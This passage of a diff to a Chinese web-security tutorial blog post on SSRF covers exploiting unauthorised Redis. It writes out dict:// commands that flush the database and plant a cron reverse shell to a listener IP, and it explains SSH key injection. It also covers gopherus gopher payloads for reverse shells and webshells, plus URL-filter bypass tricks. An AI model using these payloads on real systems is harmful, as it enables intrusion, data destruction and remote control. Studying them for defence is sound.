+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 清空数据库(慎用)</span><br><span class="line">dict://10.0.0.10:6379/flushall</span><br><span class="line"># 设置工作目录</span><br><span class="line">dict://10.0.0.10:6379/config set dir /var/spool/cron/crontabs/</span><br><span class="line"># 设置保存的文件名</span><br><span class="line">dict://10.0.0.10:6379/config set dbfilename root</span><br><span class="line"># 设置变量x, 若在本地kali监听, 下方ip需修改为kali</span><br><span class="line">dict://10.0.0.10:6379/set x &quot;\n\n*/1 * * * * bash -i &amp;&gt; /dev/tcp/10.0.0.20/1234 0&gt;&amp;1\n\n&quot;</span><br><span class="line"># 这里 \n 越多越好(防止换行失败导致反弹shell失败)</span><br><span class="line"># 保存</span><br><span class="line">dict://10.0.0.10:6379/save</span><br></pre></td></tr></table></figure></li>
+</ol>
+<hr>
+<h5 id="03-SSH公钥写入"><a href="#03-SSH公钥写入" class="headerlink" title="03 SSH公钥写入"></a>03 SSH公钥写入</h5><p>SSH 密钥对, 一把公钥, 一把私钥, 公钥存放在 SSH 服务器, 私钥个人保存</p>
+<ul>
+<li><p>公钥登录: <code>public key 认证</code></p>
+</li>
+<li><p>原理:</p>
+<ol>
+<li><p>用户将公钥存储在远程服务器</p>
+</li>
+<li><p>登录时远程服务器向用户发送一段随机字符串</p>
+</li>
+<li><p>私钥加密字符串, 发送给远程主机</p>
+</li>
+<li><p>远程主机使用公钥解密, 解密成功 → 登录</p>
+</li>
+</ol>
+<blockquote>
+<p>public key 认证图解</p>
+</blockquote>
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/8.png"></p>
+</li>
+</ul>
+<p><strong>漏洞原理:</strong></p>
+<ul>
+<li>Redis 服务未授权可以写入文件</li>
+<li>将公钥写入服务器即可实现免密登录</li>
+</ul>
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/9.png"></p>
+<hr>
+<h5 id="04-gopher协议攻击内网应用"><a href="#04-gopher协议攻击内网应用" class="headerlink" title="04 gopher协议攻击内网应用"></a>04 gopher协议攻击内网应用</h5><p><code>gopher</code>可发送各种格式的请求包, 攻击内网FTP, Telnet, Redis, Memcache, 也可以进行GET, POST请求, 还可以攻击内网未授权MySQL</p>
+<p><code>gopher</code> 协议默认端口70, 所以需要指定web端口, 且需要指定方法, 数据需要进行URL, 回车换行使用<code>%0d</code> <code>%0a</code></p>
+<p><strong>基本协议格式:</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;TCP数据流</span><br></pre></td></tr></table></figure>
+
+<p>gopherus 运用</p>
+<p>在 SSRF 易受攻击的站点上生成 gopher 负载以利用 SSRF 并获得 RCE</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看工具帮助以及受支持的攻击类型</span></span><br><span class="line">uv run gopherus.py -h</span><br><span class="line"><span class="comment"># 攻击redis</span></span><br><span class="line">uv run gopherus.py --exploit redis</span><br><span class="line"><span class="comment">#   [1] ReverseShell - 反弹 Shell 到攻击机</span></span><br><span class="line"><span class="comment">#   [2] PHPShell     - 写入 PHP WebShell</span></span><br><span class="line"><span class="comment"># 1. 配置监听地址 100.100.103.85(redis服务器地址)</span></span><br><span class="line"><span class="comment"># 2. 配置 Crontab 目录</span></span><br><span class="line"><span class="comment"># 3. 自动生成利用链接 gopher://xxx...[相当于简化版定时任务]</span></span><br><span class="line"><span class="comment"># 4. 攻击机开启监听</span></span><br><span class="line">nc -lvp 1234</span><br><span class="line"><span class="comment"># 5. 将利用链接URL 编码至SSRF漏洞中</span></span><br><span class="line"><span class="comment"># 6. RCE</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-0-绕过"><a href="#4-0-绕过" class="headerlink" title="4.0 绕过"></a>4.0 绕过</h3><table>
+<thead>
+<tr>
+<th>绕过类型</th>
+<th>案例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>302跳转</td>
+<td><code>sudo.cc</code>服务, 访问服务时, 自动重定向到<code>127.0.0.1</code></td>
+</tr>
+<tr>
+<td><code>@</code>绕过</td>
+<td><code>xx@host</code>&#x3D;&#x3D;<code>host</code>, 只解析<code>@</code>之后的内容</td>
+</tr>
+<tr>
+<td>IP进制编码</td>
+<td><code>127.0.0.1</code>&#x3D;&#x3D;<code>0x7f.0x0.0x0.0x1(Hex)</code>…</td>
+</tr>
+<tr>
+<td>特殊数字</td>
+<td>如: 1②7.0.0.1</td>
+</tr>
+<tr>
+<td>中文句号</td>
+<td><code>。</code>代替<code>.</code></td>
+</tr>
+<tr>
+<td>0省略</td>
+<td><code>127.0.0.1</code>&#x3D;&#x3D;<code>127.1</code></td>
+</tr>
+<tr>
+<td>特殊0</td>
+<td>在Windows中0代表0.0.0.0 ; Linux中0代表127.0.0.1</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>以上绕过现代系统大多数均已修复, 仅作了解</p>
+</blockquote>
+<hr>
+<h3 id="5-0-防御"><a href="#5-0-防御" class="headerlink" title="5.0 防御"></a>5.0 防御</h3><table>
 <thead>
 <tr>
 <th>防御措施</th>
@@ -515,10 +723,13 @@
           <div class="post-tags">
               <a href="/tags/ssrf/" rel="tag"># ssrf</a>
               <a href="/tags/curl/" rel="tag"># curl</a>
-              <a href="/tags/file/" rel="tag"># file</a>
-              <a href="/tags/dict/" rel="tag"># dict</a>
+              <a href="/tags/file/" rel="tag"># file://</a>
+              <a href="/tags/dict/" rel="tag"># dict://</a>
+              <a href="/tags/%E5%8F%8D%E5%BC%B9shell/" rel="tag"># 反弹shell</a>
               <a href="/tags/pikachu/" rel="tag"># pikachu</a>
-              <a href="/tags/gopher/" rel="tag"># gopher</a>
+              <a href="/tags/gopher/" rel="tag"># gopher://</a>
+              <a href="/tags/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" rel="tag"># 定时任务</a>
+              <a href="/tags/ssh/" rel="tag"># ssh</a>
           </div>
 
         
@@ -530,8 +741,8 @@
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2026/08/10/web-security/rce/2026-08-10-rce/" rel="next" title="RCE">
-                  RCE <i class="fa fa-angle-right"></i>
+                <a href="/2026/08/08/web-security/csrf/2026-08-08-csrf/" rel="next" title="CSRF">
+                  CSRF <i class="fa fa-angle-right"></i>
                 </a>
             </div>
           </div>
